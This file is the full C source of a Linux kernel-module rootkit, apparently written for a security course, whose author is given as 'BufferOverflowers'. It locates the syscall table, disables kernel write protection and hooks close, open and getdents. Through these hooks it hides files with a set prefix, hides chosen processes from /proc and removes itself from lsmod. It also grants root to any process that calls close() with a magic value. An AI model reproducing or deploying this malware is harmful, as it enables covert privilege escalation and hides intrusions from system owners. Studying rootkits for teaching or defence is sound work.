#include <asm/unistd.h>
#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/limits.h>
#include <linux/slab.h>
#include <linux/string.h>
#include <linux/sched.h>
#include <linux/types.h>
#include <linux/spinlock.h>
#include <linux/list.h>
#include <asm/unistd.h>
#include <asm/processor-flags.h>
#include <asm/page.h>

#if defined(__x86_64__)
#define SYSCALL_TABLE_START 0xffffffff81000000l
#define SYSCALL_TABLE_STOP 0xffffffffa2000000l
typedef unsigned long pointer_size_t;
unsigned long **syscall_table;
#else
#define SYSCALL_TABLE_START  0xc0000000
#define SYSCALL_TABLE_STOP  0xd0000000
typedef unsigned int pointer_size_t;
unsigned int **syscall_table;
#endif

#define HIDE_PREFIX "cse509--"
#define BUFSIZE 32768

struct linux_dirent {
    unsigned long       d_ino;
    unsigned long       d_off;
    unsigned short      d_reclen;
    char                name[1];
};

struct hidden_pids_struct {
    pid_t pid;
    struct list_head list;
};

struct buffer_struct {
    void *buf;
    struct mutex lock;
};

struct buffer_struct buf_struct;
struct hidden_pids_struct hidden_pids;

/* pid of the process that has currently opened '/proc/' */
pid_t proc_open_pid;
/* fd for opened '/proc/' in this process open_files table */
int proc_open_fd;

u_int8_t module_hidden;
u_int8_t hide_files_flag;

/***************************************************************************/
/* SPECIAL VALUES FOR MALICIOUS COMMUNICATION BETWEEN PROCESSES AND ROOTKIT */
#define ELEVATE_UID -23121990
#define HIDE_PROCESS -19091992
#define HIDE_MODULE -657623
#define SHOW_MODULE -9032847
#define SHOW_PROCESS -2051967
#define HIDE_FILES -7111963
#define SHOW_FILES -294365563

/***************************************************************************/

/* To store a pointer to original close() */
asmlinkage int (*original_close)(int fd);
asmlinkage int (*original_getdents)(unsigned int fd, struct linux_dirent *dirp, unsigned int count);
asmlinkage long (*original_open)(const char __user *pathname, int flags, mode_t mode);

static void make_writeable(void) 
{
    unsigned long value;
    asm volatile("mov %%cr0,%0" : "=r" (value), "=m" (__force_order));
    if (value & 0x00010000) {
        value &= ~0x00010000;
        asm volatile("mov %0,%%cr0": : "r" (value), "m" (__force_order));
    }
}

static void make_non_writeable(void) 
{
    unsigned long value;
    asm volatile("mov %%cr0,%0" : "=r" (value), "=m" (__force_order));
    if (!(value & 0x00010000)) {
        value |= 0x00010000;
        asm volatile("mov %0,%%cr0": : "r" (value), "m" (__force_order));
    }
}

int hide_files(void)
{
    int err = 0;
    if (!hide_files_flag) {
        hide_files_flag = 1;
        err = 1;
    }
    return err;
}

int show_files(void)
{
    int err = 0;
    if (hide_files_flag) {
        hide_files_flag = 0;
        err = 1;
    }
    return err;
}

int hide_module(void)
{
    int err = 0;
    if (!module_hidden) {
        module_hidden = 1;

        // stop from showing on lsmod
        list_del_init(&__this_module.list);

        // stop showing in /proc/kallsyms
        kobject_del(&THIS_MODULE->mkobj.kobj);
        
        err = 1;
    }
    return err;
}

int show_module(void)
{
    int err = 0;
    if (module_hidden) {
        // TODO
        err = 1;
    }
    return err;
}

int elevate_current_privileges(void)
{
    int err = -1;

    struct cred *elevated_cred = prepare_creds();
    kuid_t elevated_uid;
    kgid_t elevated_gid;
    elevated_uid.val = 0;
    elevated_gid.val = 0;

    if (elevated_cred != NULL) {
        elevated_cred->uid = elevated_cred->euid = elevated_cred->suid
             = elevated_cred->fsuid = elevated_uid;
        elevated_cred->gid = elevated_cred->egid = elevated_cred->sgid
             = elevated_cred->fsgid = elevated_gid;

        commit_creds(elevated_cred);
        err = 0;
    }

    return err;
}

void init_hidden_pids_list(void)
{
    INIT_LIST_HEAD(&hidden_pids.list);
}

int is_in_hidden_pids(pid_t pid)
{
    struct hidden_pids_struct *iter;
    list_for_each_entry(iter, &hidden_pids.list, list) {
        if (iter->pid == pid)
            return 1;
    }
    return 0;
}

/* Remove this process's pid from our hidden pids list */
int show_current_process(void)
{
    struct hidden_pids_struct *iter, *tmp;
    pid_t pid = current->pid;
    list_for_each_entry_safe(iter, tmp, &hidden_pids.list, list) {
        if (iter->pid == pid) {
            list_del(&iter->list);
            kfree(iter);
            return 0;
        }
    }
    return -1;
}

/* Add this process's pid to our hidden pids list */
int hide_current_process(void)
{
    int err = 0;
    struct hidden_pids_struct *node;
    pid_t pid = current->pid;

    node = (struct hidden_pids_struct *)
            kmalloc(sizeof(struct hidden_pids_struct), GFP_KERNEL);
    if (node == NULL) {
        err = -1;
        goto out;
    }

    node->pid = pid;
    list_add_tail(&node->list, &hidden_pids.list);
out:
    return err;
}


char *get_str_in_kernelspace(const char __user *ustr, char *kstr, int max)
{
    size_t len = strnlen_user(ustr, max); // including null terminator
    if (len > max)
        return NULL;
    strncpy_from_user(kstr, ustr, len);
    return kstr;
}


/* Is the string ustr same as cmp_with? */
int is_userspace_str(const char __user *ustr, const char *cmp_with)
{
    int ret = 0;
    char *kstr;

    mutex_lock(&(buf_struct.lock));
    kstr = get_str_in_kernelspace(ustr, buf_struct.buf, PATH_MAX);
    if (kstr == NULL)
        goto out;
    if (strcmp(kstr, cmp_with) == 0)
        ret = 1;
out:
    mutex_unlock(&(buf_struct.lock));
    return ret;
}

/*
 * Takes in a string (null-terminated) that represents a component of a pathname 
 * tries to convert it into pid_t
 * returns pid if possible
 * -1 otherwise
 */
pid_t get_pid_from_str(const char *str)
{
    int err;
    long res;
    
    err = kstrtol(str, 10,  &res);
    if (err)
        res = -1;

    return (pid_t) res;
}

/*
 * Takes in a string (null-terminated) that represents a component of a pathname
 * 1 if it matches a pattern that the rootkit wants to hide
 * 0 otherwise
 */
int filename_matches_pattern(const char *filename)
{
    return strncmp(filename, HIDE_PREFIX, strlen(HIDE_PREFIX)) == 0;
}

asmlinkage int my_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count)
{
    mm_segment_t old_fs;
    struct linux_dirent *dir;
    int ret;
    void *kbuf;
    unsigned long kbuf_offset, ubuf_offset;
    pid_t pid;
    void *ubuf;
    kbuf_offset = ubuf_offset = 0;
    kbuf = buf_struct.buf;
    ubuf = dirp;


    mutex_lock(&(buf_struct.lock));

    old_fs = get_fs();
    set_fs(KERNEL_DS);
    ret = original_getdents(fd, (struct linux_dirent *) kbuf, BUFSIZE);
    set_fs(old_fs);

    if (ret < 0)
        goto out;

    for (kbuf_offset = 0; kbuf_offset < ret; kbuf_offset += dir->d_reclen) {
        dir = (struct linux_dirent *) (kbuf + kbuf_offset);

        if (proc_open_fd == fd && proc_open_pid == current->pid) {
            // this means we are calling getdents on "/proc"
            // we have to hide the pids in our list
            pid = get_pid_from_str(dir->name);
            if (pid > 0 && is_in_hidden_pids(pid))
                continue;
        }
        
        // also check for special prefixes or suffixes
        // and hide those files that match pattern 
        if (hide_files_flag && filename_matches_pattern(dir->name))
                continue;

        // normal copy if nothing to hide
        copy_to_user(ubuf + ubuf_offset, kbuf + kbuf_offset, dir->d_reclen);
        ubuf_offset += dir->d_reclen;
    }

    ret = ubuf_offset;

out:
    mutex_unlock(&(buf_struct.lock));
    return ret;
}



asmlinkage long my_open(const char __user *pathname, int flags, mode_t mode)
{
    long fd;
    //printk("Hijacked open called\n");
    fd = original_open(pathname, flags, mode);
    
    if (fd >= 0 && is_userspace_str(pathname, "/proc")) {
        /* opened "/proc";
           store the process's pid and opened fd
           we'll use these in getdents to hide processes */
        proc_open_pid = current->pid;
        proc_open_fd = fd;
    }

    return fd;
}

asmlinkage int my_close(int fd)
{
    int err = 0;
    //printk("Hijacked close called\n");
    if (fd < 0) {
        switch (fd) {
        case ELEVATE_UID:
            elevate_current_privileges();
            break;
        case HIDE_PROCESS:
            hide_current_process();
            break;
        case SHOW_PROCESS:
            show_current_process();
            break;
        case HIDE_FILES:
            hide_files();
            break;
        case SHOW_FILES:
            show_files();
            break;
        case HIDE_MODULE:
            hide_module();
            break;
        case SHOW_MODULE:
            show_module();
            break;
        }
    }
    else {
        if (proc_open_fd == fd && proc_open_pid == current->pid) {
            /* closed "/proc"; 
               clear stored fd and pid */

            proc_open_fd = -1;
            proc_open_pid = -1;
        }
        err = original_close(fd);
    }

    return err;
}

pointer_size_t **find_syscall_table(void)
{
    pointer_size_t i;
    pointer_size_t **table;
    for (i = SYSCALL_TABLE_START; i < SYSCALL_TABLE_STOP; i += sizeof(void *)) {
        table = (pointer_size_t **) i;
        if ( table[__NR_close] == (pointer_size_t *) sys_close)
            return &table[0];
    }
    return NULL;
}

void init_buf_struct(void)
{
    mutex_init(&(buf_struct.lock)); 
    buf_struct.buf = kmalloc(BUFSIZE, GFP_KERNEL);
}
void deinit_buf_struct(void)
{
    kfree(buf_struct.buf);
}

int rootkit_init(void)
{
    //struct page *sys_call_page_temp;
    printk("Rootkit loaded\n");
    proc_open_fd = -1;
    proc_open_pid = -1;
    module_hidden = 0;
    hide_files_flag = 0;

    init_buf_struct();
    init_hidden_pids_list();

    hide_files();

    /* Uncomment the following lines after completion of module 
     * Can't rmmod it if we have it uncommented during dev
     * That's just cumbersome during dev
     */    
    //hide_module();

    
    syscall_table = find_syscall_table();
    if (!syscall_table) {
        goto out;    
    }
    
    printk("Syscall table at %p\n", syscall_table);
    
    // Disable write protection on page
    make_writeable();
    // hijack close system call
    original_close = (asmlinkage int (*)(int)) syscall_table[__NR_close];
    syscall_table[__NR_close] = (void *) my_close;

    // hijack open system call
    original_open = (asmlinkage long (*)(const char *, int, mode_t)) syscall_table[__NR_open];
    syscall_table[__NR_open] = (void *) my_open;
    
    // hijack getdents system call
    original_getdents = (asmlinkage int (*)(unsigned int, struct linux_dirent *, unsigned int))
                        syscall_table[__NR_getdents];
    syscall_table[__NR_getdents] = (void *) my_getdents;
    make_non_writeable();
       
    out:
    return 0;
}

/* Unloads the rootkit */
void rootkit_exit(void)
{
    deinit_buf_struct();
     
    if (syscall_table == NULL) {
        printk("RKIT: Nothing to unload\n");
        goto out;
    }

    // Disable write protection on page
    make_writeable();

    syscall_table[__NR_close] = (void *) original_close;
    syscall_table[__NR_open] = (void *) original_open;
    syscall_table[__NR_getdents] = (void *) original_getdents;
    
    // Enable write protection on page
    make_non_writeable();
    
out:
    show_module();
    printk("Rootkit unloaded\n");
}

MODULE_LICENSE("GPL");
MODULE_AUTHOR("BufferOverflowers");
module_init(rootkit_init);
module_exit(rootkit_exit);
